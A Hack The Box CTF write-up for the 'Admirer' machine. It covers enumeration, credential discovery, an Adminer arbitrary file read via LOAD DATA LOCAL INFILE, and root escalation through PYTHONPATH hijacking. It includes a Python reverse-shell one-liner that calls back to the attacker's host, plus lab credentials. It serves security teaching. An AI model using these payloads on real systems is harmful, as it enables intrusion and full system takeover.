---
layout: posts
title: "HTB — Admirer Writeup"
date: 2026-01-23
tags: [htb, writeup, linux, web]
categories: [ctf]
---

## Overview

- **Machine:** Admirer
- **Platform:** Hack The Box
- **OS:** Linux
- **Difficulty:** Easy

Admirer is an easy machine on HackTheBox that shows the importance of basic directory fuzzing and file enumeration, as well as core understanding of the configuration in sudo and the interaction between Linux and Python.

---

## Enumeration

### Nmap Scan

```bash
┌──(kali㉿kali)-[~/hackthebox/admirer/utility-scripts]
└─$ sudo nmap -p- -sVC 10.129.4.46

Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-20 12:29 EST
Nmap scan report for admirer.htb (10.129.4.46)
Host is up (0.033s latency).
Not shown: 65532 closed tcp ports (reset)

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey:
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|   256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry
|_/admin-dir
| http-server-header: Apache/2.4.25 (Debian)
| http-title: Admirer
Service Info: OS: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/
Nmap done: 1 IP address (1 host up) scanned in 29.14 seconds
```


Nmap reveals a few interesting ports, starting with port 21, FTP, where anonymous access is not allowed, so that is as far as we can go there.
Next stop, port 80. Clicking around doesn’t reveal anything interesting and the contact form seems to not be implemented yet. Running feroxbuster in the background while I play around with the page.

<p align="center">
  <img src="/assets/images/admirer/Captura2.PNG" width="700">
</p>

Nmap showed us that there’s a robots.txt. Taking a look at it reveals an interesting directory, `/admin-dir`, however it returns a 403 — forbidden.

<p align="center">
  <img src="/assets/images/admirer/Captura5.PNG" width="700">
</p>

<p align="center">
  <img src="/assets/images/admirer/Captura3.PNG" width="700">
</p>

<p align="center">
  <img src="/assets/images/admirer/Captura4.PNG" width="700">
</p>

Beyond that, it displays some interesting information:  
> “This folder contains personal contacts and creds”.

I waited around 10 minutes for my initial feroxbuster scan to finish, but nothing interesting popped up:


```bash
┌──(kali㉿kali)-[~/hackthebox/admirer/utility-scripts]
└─$ feroxbuster \
    -u http://admirer.htb \
    -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
    -x php -q

301      GET      91l     28w      311c http://admirer.htb/images        -> /images/
301      GET      91l     28w      314c http://admirer.htb/admin-dir     -> /admin-dir/
301      GET      91l     28w      318c http://admirer.htb/assets        -> /assets/

200      GET    1531l    529w    6051c http://admirer.htb/index.php
200      GET      21l     87w    2439c http://admirer.htb/assets/js/jquery.min.js
200      GET    2050l   4273w   44147c http://admirer.htb/assets/css/main.css

200      GET    2811l   1437w   99825c http://admirer.htb/images/thumbs/thmb_mus01.jpg
200      GET    4091l   2427w  158968c http://admirer.htb/images/fulls/mind02.jpg
```

My instant thought after reading the comment in `robots.txt` was scanning the `admin-dir` directly, with new extensions like `.txt` or `.pdf` that could contain the mentioned “contacts” and “creds”.

```bash
┌──(kali㉿kali)-[~/hackthebox/admirer]
└─$ feroxbuster \
    -u http://admirer.htb/admin-dir \
    -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
    -x txt,pdf

──────────────────────────────────────────────────────────────
Target URL            : http://admirer.htb/admin-dir
Threads               : 50
Wordlist              : directory-list-2.3-medium.txt
Status Codes          : All
Timeout               : 7s
User-Agent            : feroxbuster/2.11.0
Extensions            : txt, pdf
HTTP Methods          : GET
Recursion Depth       : 4
──────────────────────────────────────────────────────────────

301      GET      91l     28w      314c http://admirer.htb/admin-dir/ -> /admin-dir/
200      GET      29l     39w      350c http://admirer.htb/admin-dir/contacts.txt
200      GET      11l     13w      136c http://admirer.htb/admin-dir/credentials.txt
```

**Credentials.txt**

<p align="center">
  <img src="/assets/images/admirer/Captura8.PNG" width="700">
</p>

**Contacts.txt**

<p align="center">
  <img src="/assets/images/admirer/Captura9.PNG" width="700">
</p>


The most interesting information here is the FTP user. As we saw earlier, there is an FTP server that doesn’t allow anonymous access. With our newly obtained credentials, we can now log in:

```bash
┌──(kali㉿kali)-[~]
└─$ ftp admirer.htb
Connected to admirer.htb.
220 (vsFTPd 3.0.3)
Name (admirer.htb:kali): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

These two files both look interesting, so I transferred them to my machine for further analysis:

```bash
┌──(kali㉿kali)-[~]
└─$ ftp admirer.htb
Connected to admirer.htb.
220 (vsFTPd 3.0.3)
Name (admirer.htb:kali): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls
229 Entering Extended Passive Mode (|||35170|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0          3405 Dec 02  2019 dump.sql
-rw-r--r--    1 0        0       5270987 Dec 03  2019 html.tar.gz
226 Directory send OK.
```
```bash
ftp> ls
229 Entering Extended Passive Mode (|||53039|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0            3405 Dec 02  2019 dump.sql
-rw-r--r--    1 0        0         5270987 Dec 03  2019 html.tar.gz
226 Directory send OK.

ftp> prompt off
Interactive mode off.

ftp> mget *
local: dump.sql remote: dump.sql
150 Opening BINARY mode data connection for dump.sql (3405 bytes).
226 Transfer complete.

local: html.tar.gz remote: html.tar.gz
150 Opening BINARY mode data connection for html.tar.gz (5270987 bytes).
226 Transfer complete.
```



I had high expectations for `dump.sql`, but it doesn’t reveal anything interesting. As stated, it’s just a backup for a database named `admirerdb` that contains only one table with the contents of the main page.

```bash
┌──(kali㉿kali)-[~/hackthebox/admirer/utility-scripts]
└─$ cat dump.sql
```
```sql
-- MySQL dump 10.16  Distrib 10.1.41-MariaDB, for debian-linux-gnu (x86_64)
--
-- Host: localhost    Database: admirerdb
-- ------------------------------------------------------
-- Server version       10.1.41-MariaDB-0+deb9u1

DROP TABLE IF EXISTS `items`;
CREATE TABLE `items` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `thumb_path` text NOT NULL,
  `image_path` text NOT NULL,
  `title` text NOT NULL,
  `text` text,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=13 DEFAULT CHARSET=utf8mb4;

INSERT INTO `items` VALUES
(1,'images/thumbs/thmb_art01.jpg','images/fulls/art01.jpg','Visual Art','A pure showcase of skill and emotion.'),
(2,'images/thumbs/thmb_eng02.jpg','images/fulls/eng02.jpg','The Beauty and the Beast','Besides the technology, there is also the eye candy...'),
(3,'images/thumbs/thmb_nat01.jpg','images/fulls/nat01.jpg','The uncontrollable lightshow','When the sun decides to play at night.'),
(4,'images/thumbs/thmb_arch02.jpg','images/fulls/arch02.jpg','Nearly Monochromatic','One could simply spend hours looking at this indoor square.'),
(5,'images/thumbs/thmb_mind01.jpg','images/fulls/mind01.jpg','Way ahead of his time','You probably still use some of his inventions... 500yrs later.'),
(6,'images/thumbs/thmb_mus02.jpg','images/fulls/mus02.jpg','The outcomes of complexity','Seriously, listen to Dust in Interstellar''s OST. Thank me later.'),
(7,'images/thumbs/thmb_arch01.jpg','images/fulls/arch01.jpg','Back to basics','And centuries later, we want to go back and live in nature... Sort of.'),
(8,'images/thumbs/thmb_mind02.jpg','images/fulls/mind02.jpg','We need him back','He might have been a loner who allegedly slept with a pigeon, but that brain...'),
(9,'images/thumbs/thmb_eng01.jpg','images/fulls/eng01.jpg','In the name of Science','Some theories need to be proven.'),
(10,'images/thumbs/thmb_mus01.jpg','images/fulls/mus01.jpg','Equal Temperament','Because without him, music would not exist (as we know it today).');
```


We also obtained an `html.tar.gz`. Extracting its contents reveals a backup of the website:

<p align="center">
  <img src="/assets/images/admirer/Captura13.PNG" width="700">
</p>

The most interesting files here are our already reviewed `contacts.txt` and `credentials.txt`.  
The `index.php` file also contains some credentials, but they don’t seem to work anywhere.

More importantly, a new directory is revealed: `/utility-scripts`.  
Accessing it through Firefox also returns a forbidden response:

<p align="center">
  <img src="/assets/images/admirer/Captura14.PNG" width="700">
</p>

<p align="center">
  <img src="/assets/images/admirer/Captura15.PNG" width="700">
</p>

Nonetheless, we now know that the directory contains four PHP scripts:
- `admin_tasks.php`
- `db_admin.php`
- `info.php`
- `phptest.php`

Out of these, the most interesting ones are `admin_tasks.php` and `db_admin.php`.

```php
<?php
$servername = "localhost";
$username   = "waldo";
$password   = "Wh3r3_1s_w4ld0?";

// Create connection
$conn = new mysqli($servername, $username, $password);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

echo "Connected successfully";

// TODO: Finish implementing this or find a better open source alternative
?>
```


Why is this interesting? I tried the given credentials via SSH and FTP but had no success.  
Despite looking plain at first, accessing it returns a 404. Looking at the comment at the bottom, it seems they already found a “better open source alternative”:

<p align="center">
  <img src="/assets/images/admirer/Captura17.PNG" width="700">
</p>

Why is `admin_tasks.php` interesting?  
Beyond being the longest of the four scripts, this one actually has functionality — it executes system commands.

```php
<html>
<head>
  <title>Administrative Tasks</title>
</head>
<body>

<h3>Admin Tasks Web Interface (v0.01 beta)</h3>

<?php
// Web interface to the admin_tasks script

if (isset($_REQUEST['task'])) {

    $task = $_REQUEST['task'];

    if ($task == '1' || $task == '2' || $task == '3' ||
        $task == '4' || $task == '5' || $task == '6' || $task == '7') {

        /*
        **********************************************************************
        Available options:
          1) View system uptime
          2) View logged in users
          3) View crontab (current user only)
          4) Backup passwd file (not working)
          5) Backup shadow file (not working)
          6) Backup web data (not working)
          7) Backup database (not working)

        NOTE: Options 4-7 are currently NOT working because they need root
              privileges. I'm leaving them in the valid tasks in case I figure
              out a way to securely run code as root from PHP.
        **********************************************************************
        */

        echo str_replace(
            "\n",
            "<br />",
            shell_exec("/opt/scripts/admin_tasks.sh $task 2>&1")
        );

    } else {
        echo("Invalid task.");
    }
}
?>

<p>
<h4>Select task:</h4>
<form method="POST">
  <select name="task">
    <option value="1">View system uptime</option>
    <option value="2">View logged in users</option>
    <option value="3">View crontab</option>
    <option value="4" disabled>Backup passwd file</option>
    <option value="5" disabled>Backup shadow file</option>
    <option value="6" disabled>Backup web data</option>
    <option value="7" disabled>Backup database</option>
  </select>
  <input type="submit" value="Submit">
</form>

</body>
</html>
```

<p align="center">
  <img src="/assets/images/admirer/Captura19.PNG" width="700">
</p>

After reviewing `admin_tasks.php`, I initially thought about some form of RCE, but reading through the code didn’t help much. The script is protected against common attack paths.

While experimenting with this, I also ran another scan against `/utility-scripts`, this time focusing specifically on PHP files, to check if there were any scripts missing from our backup.

```bash
┌──(kali㉿kali)-[~/hackthebox/admirer]
└─$ feroxbuster \
    -u http://admirer.htb/utility-scripts \
    -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
    -x php

──────────────────────────────────────────────────────────────
Target URL            : http://admirer.htb/utility-scripts
Threads               : 50
Wordlist              : directory-list-2.3-medium.txt
Status Codes          : All
Timeout               : 7s
User-Agent            : feroxbuster/2.11.0
Extensions            : php
HTTP Methods          : GET
Recursion Depth       : 4
──────────────────────────────────────────────────────────────

403      GET      91l     28w      320c http://admirer.htb/utility-scripts/
403      GET      91l     28w      314c http://admirer.htb/admin-dir/
200      GET    9621l   4963w   83740c http://admirer.htb/utility-scripts/info.php
200      GET      11l      8w       32c http://admirer.htb/utility-scripts/phptest.php
```



At this point I wasn’t satisfied, so I tried another wordlist (I actually tested four in total, and this one finally paid off):

```bash
┌──(kali㉿kali)-[~/hackthebox/admirer]
└─$ feroxbuster \
    -u http://admirer.htb/utility-scripts \
    -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt \
    -x php -q

403      GET      91l     31w      276c http://admirer.htb/utility-scripts/
403      GET      91l     28w      320c http://admirer.htb/admin-dir/
200      GET    9621l   4963w   83740c http://admirer.htb/utility-scripts/info.php
200      GET     961l    493w    83740c http://admirer.htb/utility-scripts/adminer.php   <-- interesting
200      GET      11l      8w       32c http://admirer.htb/utility-scripts/phptest.php
```



**Adminer.php**

<p align="center">
  <img src="/assets/images/admirer/Captura22.PNG" width="700">
</p>

Adminer is a lightweight, single-file PHP script that serves as a powerful web-based tool for managing multiple types of databases, acting as a simpler alternative to tools like phpMyAdmin, supporting systems like MySQL, PostgreSQL, SQLite, MS SQL, MongoDB, and more, allowing for database creation, table management, data editing, SQL execution, and user administration via a web browser. I tried every credential gathered till now:

<p align="center">
  <img src="/assets/images/admirer/Captura23.PNG" width="700">
</p>

However, when I replace “localhost” with my local IP, I do receive a call

<p align="center">
  <img src="/assets/images/admirer/Captura24.PNG" width="700">
</p>

<p align="center">
  <img src="/assets/images/admirer/Captura25.PNG" width="700">
</p>



MySQL configuration:

To make this connection work the first we have to do is initiate a functional sql server. This is fairly easy in kali:

```bash
┌──(kali㉿kali)-[~/hackthebox/admirer]
└─$ sudo service mysql start  

──(kali㉿kali)-[~/hackthebox/admirer]
└─$ sudo mysql -u root
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 32
Server version: 11.4.5-MariaDB-1 Debian n/a

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Support MariaDB developers by giving a star at https://github.com/MariaDB/server
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> create database admirertest;
Query OK, 1 row affected (0.000 sec)

MariaDB [(none)]> create user 'admirertest'@'10.129.229.101' identified by 'passwordtest';
Query OK, 0 rows affected (0.004 sec)

MariaDB [(none)]> GRANT ALL on admirertest.* TO 'admirertest'@'10.129.229.101';
Query OK, 0 rows affected (0.002 sec)

MariaDB [(none)]> FLUSH PRIVILEGES;
Query OK, 0 rows affected (0.000 sec)
```


When trying to access, we get a permission denied from the adminer page. 

<p align="center">
  <img src="/assets/images/admirer/Captura40.PNG" width="700">
</p>

This is because mysql doesn’t listen on a routable interface, meaning, it will only accept connections locally. How do we fix this? Simple enough, we just need to change a configuration file (I followed [this post](https://www.tencentcloud.com/techpedia/114093)). It’s important to note that this change must be reverted after finishing the machine, as it can be a security issue for us. Configuration files are usually in the directory /etc, and we can find /mysql inside:

```bash
┌──(kali㉿kali)-[~/hackthebox/admirer]
└─$ ls -la /etc/mysql
total 40
drwxr-xr-x  4 root root  4096 Mar  7  2025 .
drwxr-xr-x 212 root root 12288 Jan 22 13:29 ..
drwxr-xr-x  2 root root  4096 Mar  7  2025 conf.d
-rw-r--r--  1 root root   544 Mar  7  2025 debian.cnf
-rwxr-xr-x  1 root root  1770 Feb 19  2025 debian-start
-rw-r--r--  1 root root  1126 Feb 19  2025 mariadb.cnf
drwxr-xr-x  2 root root  4096 Jan 20 11:54 mariadb.conf.d
lrwxrwxrwx  1 root root    24 Oct 20  2020 my.cnf -> /etc/alternatives/my.cnf
-rw-r--r--  1 root root   839 Oct 20  2020 my.cnf.fallback
```
Our file is in mariadb.cnf, a greping for 127.0.0.1 tells us the exact one that we want to edit:

```bash
┌──(kali㉿kali)-[/etc/mysql/mariadb.conf.d]
└─$ ls
50-client.cnf
50-mariadb-clients.cnf
50-mysqld_safe.cnf
50-server.cnf
```

```bash
┌──(kali㉿kali)-[/etc/mysql/mariadb.conf.d]
└─$ grep -R "127.0.0.1" .
./50-server.cnf:bind-address = 127.0.0.1
```

```ini
# Instead of skip-networking the default is now to listen only on
# localhost which is more compatible and is not less secure.
bind-address            = 127.0.0.1 ---> Replace this with 0.0.0.0
```
Finally, we restart the server and try again:

```bash
┌──(kali㉿kali)-[/etc/mysql/mariadb.conf.d]
└─$ sudo service mysql restart
```

<p align="center">
  <img src="/assets/images/admirer/Captura29.PNG" width="700">
</p>

Adminer File Read:

Among the newly discovered privileges, one in particular stood out: the `SQL command` option.
This feature allows us to execute arbitrary SQL queries directly on the server, which significantly expands the attack surface.

This functionality can be abused to read local files from the system by leveraging SQL file-reading capabilities. As described in this [post](https://podalirius.net/en/articles/writing-an-exploit-for-adminer-4.6.2-arbitrary-file-read-vulnerability/), only a single SQL query is required, along with a table to receive the output, in order to dump the contents of an arbitrary file.

To create the table, we can do it directly on the MYSQL server we just opened:

```sql
MariaDB [admirertest]> CREATE TABLE testadmirer ( OUTPUT TEXT(4096) );
Query OK, 0 rows affected (0.005 sec)
```

We can make sure our table is there in the main dashboard:

<p align="center">
  <img src="/assets/images/admirer/Captura30.PNG" width="700">
</p>

With the new table “testadmirer” we now have a place to dump the contents of the files in and we can use this command to test:

```sql
LOAD DATA LOCAL INFILE '/etc/passwd'
INTO TABLE testadmirer
FIELDS TERMINATED BY '\n';
```

<p align="center">
  <img src="/assets/images/admirer/Captura31.PNG" width="700">
</p>

Open_basedir is a PHP security directive that limits file access functions (e.g., fopen(), include()) to specific directories, preventing scripts from accessing unauthorized files. I’ll try a different file that doesn’t have restrictions, for example, a file in the web page. If in doubt, we can check phpinfo.php (/utility-scripts/info.php) to see the actual directory the webpage is rooted in:

<p align="center">
  <img src="/assets/images/admirer/Captura32.PNG" width="700">
</p>

Our command will be as following:

```sql
LOAD DATA LOCAL INFILE '/var/www/html/index.php'
INTO TABLE testadmirer
FIELDS TERMINATED BY '\n';
```

<p align="center">
  <img src="/assets/images/admirer/Captura33.PNG" width="700">
</p>

We now access the table to see the info we just dumped:

<p align="center">
  <img src="/assets/images/admirer/Captura34.PNG" width="700">
</p>

I remember from before that index.php actually contained some credentials. It doesn’t hurt to check if they’re different, because, as we now, the backup we got before is older and some things might’ve changed:

<p align="center">
  <img src="/assets/images/admirer/Captura35.PNG" width="700">
</p>

The password is now different than the one in index.php from the ftp server, I’ll spray this newly obtain password in ssh:

```bash
┌──(kali㉿kali)-[~/hackthebox/admirer]
└─$ sshpass -p '&<h5b~yK3F#{PaPB&dA}{H>' ssh waldo@admirer.htb
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0664 for '/home/kali/.ssh/id_rsa' are too open.
This private key will be ignored.
Load key "/home/kali/.ssh/id_rsa": bad permissions

Linux admirer 4.9.0-19-amd64 x86_64 GNU/Linux
You have new mail.
Last login: Thu Aug 24 16:09:42 2023 from 10.10.14.23

waldo@admirer:~$
```
Our user.txt can be found in /waldo/home/user.txt:

```bash
waldo@admirer:~$ ls -la
total 28
drwxr-x--- 3 waldo waldo 4096 Apr 29  2020 .
drwxr-xr-x 9 root  root  4096 Dec  2  2019 ..
lrwxrwxrwx 1 waldo waldo    9 Nov 29  2019 .bash_history -> /dev/null
-rw-r--r-- 1 waldo waldo  220 Nov 29  2019 .bash_logout
-rw-r--r-- 1 waldo waldo 3526 Nov 29  2019 .bashrc
lrwxrwxrwx 1 waldo waldo    9 Dec  2  2019 .lesshst -> /dev/null
lrwxrwxrwx 1 waldo waldo    9 Nov 29  2019 .mysql_history -> /dev/null
drwxr-xr-x 2 waldo waldo 4096 Apr 29  2020 .nano
-rw-r--r-- 1 waldo waldo  675 Nov 29  2019 .profile
-rw-r----- 1 root  waldo   33 Jan 24 17:28 user.txt
```
```bash
waldo@admirer:~$ pwd
/home/waldo
```

Root shell:

Whenever I get a plaintext password, I’ll always check first our sudo privileges:

```bash
waldo@admirer:~$ sudo -l
[sudo] password for waldo:

Matching Defaults entries for waldo on admirer:
    env_reset,
    env_file=/etc/sudoenv,
    mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin,
    listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

This script was being run by /admin_tasks.php, as the backup indicated to us. 
One crucial thing that I don’t see very often is the “SETENV” tag. To check what this means, no better place than the [sudoers manual of linux](https://linux.die.net/man/5/sudoers).

> **SETENV and NOSETENV**
>
> These tags override the value of the setenv option on a per-command basis.
> Note that if SETENV has been set for a command, the user may disable the
> env_reset option from the command line via the `-E` option.
>
> Additionally, environment variables set on the command line are not subject
> to the restrictions imposed by `env_check`, `env_delete`, or `env_keep`.
> As such, only trusted users should be allowed to set variables in this manner.
>
> If the command matched is `ALL`, the SETENV tag is implied for that command;
> this default may be overridden by use of the NOSETENV tag.

env_reset is also mentioned when running sudo -l, checking on the man page:

> If enabled, sudo will set the `HOME` environment variable to the home
> directory of the target user (which is root unless the `-u` option is used).
> This effectively means that the `-H` option is always implied.
>
> Note that `HOME` is already set when the `env_reset` option is enabled, so
> `always_set_home` is only effective for configurations where either
> `env_reset` is disabled or `HOME` is present in the `env_keep` list.
>
> This flag is off by default.

And we also have a secure_path set:

> Path used for every command run from sudo. If you don't trust the people
> running sudo to have a sane `PATH` environment variable you may want to use
> this.
>
> Another use is if you want to have the “root path” be separate from the
> “user path”. Users in the group specified by the `exempt_group` option are
> not affected by `secure_path`.
>
> This option is not set by default.

Translating this block of words, what we have in sudo is a combination of different configurations: When we run sudo, the secure_path set is going to be used, but waldo is allowed to override that and inject his own environment variables (except $PATH).
So, how can we abuse this? We now have to check the contents, privileges and permissions:

```bash
#!/bin/bash

view_uptime()
{
    /usr/bin/uptime -p
}

view_users()
{
    /usr/bin/w
}

view_crontab()
{
    /usr/bin/crontab -l
}

backup_passwd()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/passwd to /var/backups/passwd.bak..."
        /bin/cp /etc/passwd /var/backups/passwd.bak
        /bin/chown root:root /var/backups/passwd.bak
        /bin/chmod 600 /var/backups/passwd.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_shadow()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/shadow to /var/backups/shadow.bak..."
        /bin/cp /etc/shadow /var/backups/shadow.bak
        /bin/chown root:shadow /var/backups/shadow.bak
        /bin/chmod 600 /var/backups/shadow.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_db()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running mysqldump in the background, it may take a while..."
        /usr/bin/mysqldump -u root admirerdb > /var/backups/dump.sql &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

# Non-interactive way, to be used by the web interface
if [ $# -eq 1 ]
then
    option=$1
    case $option in
        1) view_uptime ;;
        2) view_users ;;
        3) view_crontab ;;
        4) backup_passwd ;;
        5) backup_shadow ;;
        6) backup_web ;;
        7) backup_db ;;
        *) echo "Unknown option." >&2
    esac

    exit 0
fi

# Interactive way, to be called from the command line
options=("View system uptime"
         "View logged in users"
         "View crontab"
         "Backup passwd file"
         "Backup shadow file"
         "Backup web data"
         "Backup DB"
         "Quit")

echo
echo "[[[ System Administration Menu ]]]"
PS3="Choose an option: "
COLUMNS=11
select opt in "${options[@]}"; do
    case $REPLY in
        1) view_uptime ; break ;;
        2) view_users ; break ;;
        3) view_crontab ; break ;;
        4) backup_passwd ; break ;;
        5) backup_shadow ; break ;;
        6) backup_web ; break ;;
        7) backup_db ; break ;;
        8) echo "Bye!" ; break ;;
        *) echo "Unknown option." >&2
    esac
done

exit 0
```
```bash
waldo@admirer:~$ ls -la /opt/scripts/admin_tasks.sh
-rwxr-xr-x 1 root admins 2613 Dec  2  2019 /opt/scripts/admin_tasks.sh
```

We can now make backups of shadow and passwd files, however, the permissions of these will make them unreachable with our current user, as the command run after using these options is chmod 600 (root can read this files but nobody else can). There is a particular function that gets my attention:

```bash
backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}
```
The option 6, backup web, executes a third python script as root. I’ll check backup.py now:

```python
#!/usr/bin/python3

from shutil import make_archive

src = '/var/www/html/'

# old ftp directory, not used anymore
# dst = '/srv/ftp/html'

dst = '/var/backups/html'

make_archive(dst, 'gztar', src)
```

Nothing in plaintext, but we know this script is importing the shutil module. Following [this post](https://leemendelowitz.github.io/blog/how-does-python-find-packages.html), plus our current configuration when running sudo, we have a clear attack path.

As explained in the post, when a Python script is executed on Linux, its modules are resolved using the PYTHONPATH environment variable. Since we are allowed to set environment variables when running the script with sudo, we can define a custom PYTHONPATH pointing to a directory containing a malicious shutil.py, which will then be imported and executed as root.

First, we create a malicious shutil.py with a python reverse shell inside of it:

```bash
waldo@admirer:/var/tmp$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.X",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")' > shutil.py
```

And now we run as sudo the option 6 on the admin_tasks.sh, setting the PYTHONPATH before:

```bash
waldo@admirer:/var/tmp$ sudo PYTHONPATH=/var/tmp /opt/scripts/admin_tasks.sh

[[[ System Administration Menu ]]]
1) View system uptime
2) View logged in users
3) View crontab
4) Backup passwd file
5) Backup shadow file
6) Backup web data
7) Backup DB
8) Quit
Choose an option: 6
Running backup script in the background, it might take a while...
```
Checking our listener:

<p align="center">
  <img src="/assets/images/admirer/Captura39.PNG" width="700">
</p>
